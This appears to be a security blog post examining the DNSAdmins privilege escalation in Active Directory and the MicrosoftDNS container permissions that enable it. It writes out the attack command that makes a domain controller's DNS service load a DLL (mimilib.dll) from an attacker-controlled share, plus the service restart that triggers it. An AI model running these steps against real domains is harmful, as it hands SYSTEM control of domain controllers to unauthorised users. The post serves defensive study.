Hello,

In this article, first part of a serie, i'm talking about **DNSAdmins** and why this is a group you should take care of. I know that several articles talk about the privilege escalation (DNS service running on a domain controller and loading an arbitrary DLL).  

We will quickly review this attack, but mainly i would rather focus on why it is still working nowadays, which permissions do you need to run this attack. I will conclude in a second part with the mitigations which can be implemented to prevent this attack.

# What is DNSAdmins ?
  
Long story short, as mentioned in the [Active Directory guide](https://www.cert.ssi.gouv.fr/uploads/guide-ad.html#dnsadmins) from the french cybersecurity national agency (ANSSI) ;
```
members of the DnsAdmins group are granted access rights to manage a Microsoft DNS service. 
```
  
So as a member of DNSAdmins group, you can manage your DNS zones and DNS services. You can for example create a new DNS zone, manage your DNS entries, start / stop the **dns.exe** service which is running as SYSTEM and being hosted, most of the time, by a domain controller. More generally you can perform any setup and configuration tasks dealing with your DNS servers.
  
We already know that a privilege escalation exists from a user being a member of DNSAdmins. As a reminder from [https://adsecurity.org/?p=4064](https://adsecurity.org/?p=4064) ;  
 - member of DNSAdmins or have write access to a DNS server object
 - DNS management is performed over RPC (UUID is 50ABC2A4–574D-40B3–9D66-EE4FD5FBA076) and the transport mechanism is the \PIPE\DNSSERVER named pipe.
 - According to Microsoft protocol specification, the “ServerLevelPluginDll” operation enables us to load a dll of our choosing (with no verification of dll path).
 - dnscmd.exe already implements this option: ```dnscmd.exe /config /serverlevelplugindll \\path\to\dll```
 - When executing this dnscmd.exe command as a user that is a member of DNSAdmins, the following registry key is populated: ```HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll```
 - Restarting the DNS service will load the DLL in this path; however, the DLL needs to contain "one of the DnsPluginInitialize, DnsPluginCleanup or DnsPluginQuery exports."
 - The DLL simply needs to be available on a network share that the Domain Controller’s computer account can access.
  
As said ;
```
DNS management is performed over RPC (UUID is 50ABC2A4–574D-40B3–9D66-EE4FD5FBA076) and the transport mechanism is the \PIPE\DNSSERVER named pipe
```  

Let's check ;
```
C:\Users\attacker\Documents\impacket>rpcdump.py DC01
...
Protocol: [MS-DNSP]: Domain Name Service (DNS) Server Management 
Provider: dns.exe 
UUID    : 50ABC2A4-574D-40B3-9D66-EE4FD5FBA076 v5.0 
Bindings: 
          ncacn_ip_tcp:0.0.0.0[49679]

```
  
# MicrosoftDNS container

**CN=System** is a top-level container of a domain naming context, which is used for miscellaneous domain configuration objects. Examples include trust objects, DNS objects, and group policy objects. It contains the **CN=MicrosoftDNS** container.  
  
In general a service with specific [access rights](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) stores its security settings in the registry key ```HKLM\System\CurrentControlSet\Services\<service_name>\security```.  
In our case, the dns service will use as security descriptor the one applied to the LDAP **MicrosoftDNS** object.  

Thanks to ldp, let's have a look at the MicrosoftDNS security descriptor ;
<img class="dropshadowclass" src="{{ site.url }}/public/images/dnsadmins/microsoftdns1.png" style="margin-top:1.5rem;margin-bottom:1.5rem;">
<img class="dropshadowclass" src="{{ site.url }}/public/images/dnsadmins/microsoftdns2.png" style="margin-top:1.5rem;margin-bottom:1.5rem;">

You also can read the *ntSecurityDescriptor* object thanks to this command ;  
```
PS C:\> (Get-ADObject "CN=MicrosoftDNS,CN=System,$((Get-ADRootDSE).defaultNamingContext)" -Properties ntSecurityDescriptor | select -ExpandProperty ntSecurityDescriptor).access | Where-Object {$_.IdentityReference -Like "*DNSAdmins*"}


ActiveDirectoryRights : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, GenericWrite, WriteDacl, WriteOwner
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : PHACKT\DnsAdmins
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
```
  
With this last command you will get the ```GENERIC_WRITE``` right, which stands for ```RIGHT_READ_CONTROL | RIGHT_DS_WRITE_PROPERTY | RIGHT_DS_WRITE_PROPERTY_EXTENDED```.  
  
So according to the [Active Directory Technical Specification](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/d2435927-0999-4c62-8c6d-13ba31a52e1a) (Page 419), what is the ```RIGHT_DS_WRITE_PROPERTY_EXTENDED``` and why is it important in our exploitation ?  

# What are the necessary rights for the exploitation
  
Let's play with DNSAdmins rights and see what happens in the context of a DNSAdmins member. Let's assume that our **attacker** user got a control path to add himself to DNSAdmins for example ;
```
PS C:\> Get-ADGroupMember DNSAdmins


distinguishedName : CN=attacker,CN=Users,DC=phackt,DC=local
name              : attacker
objectClass       : user
objectGUID        : 1cab0c62-e28b-4a80-b13f-f1ff515d6d44
SamAccountName    : attacker
SID               : S-1-5-21-3816950244-2414788102-2833019223-1612

PS C:\> whoami
phackt\attacker

PS C:\> dnscmd DC01.PHACKT.LOCAL /config /serverlevelplugindll \\attackermachine\dll\mimilib.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

```
  
<p class="note">
<i>dnscmd.exe</i> will need the DNS RSAT installed: <br><br>
<code>
Add-WindowsCapability –online –Name "Rsat.Dns.Tools~~~~0.0.1.0"
</code>
</p>
  
So what happened ?  
<img class="dropshadowclass" src="{{ site.url }}/public/images/dnsadmins/procmondll.png" style="margin-top:1.5rem;margin-bottom:1.5rem;">
  
The ```ServerPluginDll``` has been set. Now let's drop the ```RIGHT_DS_WRITE_PROPERTY_EXTENDED``` right ;
<img class="dropshadowclass" src="{{ site.url }}/public/images/dnsadmins/withoutextwrite.png" style="margin-top:1.5rem;margin-bottom:1.5rem;">
  
Then ;
```
sc.exe stop dns
sc.exe start dns
```
  
Now let's get back to our exploitation ;
<img class="dropshadowclass" src="{{ site.url }}/public/images/dnsadmins/expwithoutextwrite.png" style="margin-top:1.5rem;margin-bottom:1.5rem;">

Hum ok it does not work anymore. So let's rollback and drop this time the ```RIGHT_DS_WRITE_PROPERTY``` ;
<img class="dropshadowclass" src="{{ site.url }}/public/images/dnsadmins/expwithoutwrite.png" style="margin-top:1.5rem;margin-bottom:1.5rem;">
  
We also got ```ERROR_ACCESS_DENIED```.  
  
# First conclusion
We can run the DNSAdmins privilege escalation because DNSAdmins is a trustee with the ```RIGHT_DS_WRITE_PROPERTY``` and ```RIGHT_DS_WRITE_PROPERTY_EXTENDED``` rights on **MicrosoftDNS** container. As mentioned, the **dns.exe service is using the MicrosoftDNS security descriptor to define its access rights**.
  
<p class="note">
<b>RIGHT_DS_WRITE_PROPERTY_EXTENDED :</b>
<br><br>
The right to perform an operation controlled by a validated write access right. The ObjectType member of an ACE can contain a GUID that identifies the validated write. If ObjectType does not contain a GUID, the ACE controls the rights to perform all validated write operations associated with the object.
</p>
  
We understand that it allows the trustee (DNSAdmins) to write any [extended property](https://social.technet.microsoft.com/wiki/contents/articles/12031.active-directory-powershell-ad-module-properties.aspx#Extended_Properties) of our dns service. It makes sense that the needed rights expected to edit the registry key (the write permissions we just talked about) **are checked in the code of the DNS service**. May be it should be worth reversing the RPC exposed.  
  
We will review in a second part why DNSAdmins has to be considered as a [Protected Group](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory) and the other mitigations to implement.  
  
Let's have a look at the following groups ;
```powershell
PS C:\> Get-ADGroup DNSAdmins -Properties members,admincount


DistinguishedName : CN=DnsAdmins,CN=Users,DC=phackt,DC=local
GroupCategory     : Security
GroupScope        : DomainLocal
Members           : {}
Name              : DnsAdmins
ObjectClass       : group
ObjectGUID        : 54d747e8-f9c2-461b-b8f2-5cc0b99249cc
SamAccountName    : DnsAdmins
SID               : S-1-5-21-3816950244-2414788102-2833019223-1101



PS C:\> Get-ADGroup 'Domain Admins' -Properties members,admincount


admincount        : 1
DistinguishedName : CN=Domain Admins,CN=Users,DC=phackt,DC=local
GroupCategory     : Security
GroupScope        : Global
Members           : {CN=testdaadmin,CN=Users,DC=phackt,DC=local, CN=Administrator,CN=Users,DC=phackt,DC=local}
Name              : Domain Admins
ObjectClass       : group
ObjectGUID        : 6e647868-0e92-4686-b555-e4b5b53e1a15
SamAccountName    : Domain Admins
SID               : S-1-5-21-3816950244-2414788102-2833019223-512
```

Keep in mind that for the **Domain Admins** group, you can see the proof that the **Security Descriptor Propagator** has been processed thanks to the property **admincount** set to **1**, meaning that "Domain Admins" a **Protected Group** as we will see later. It's not the case for DNSAdmins.  
  
Thanks for reading and see you in part 2,  
Phackt.
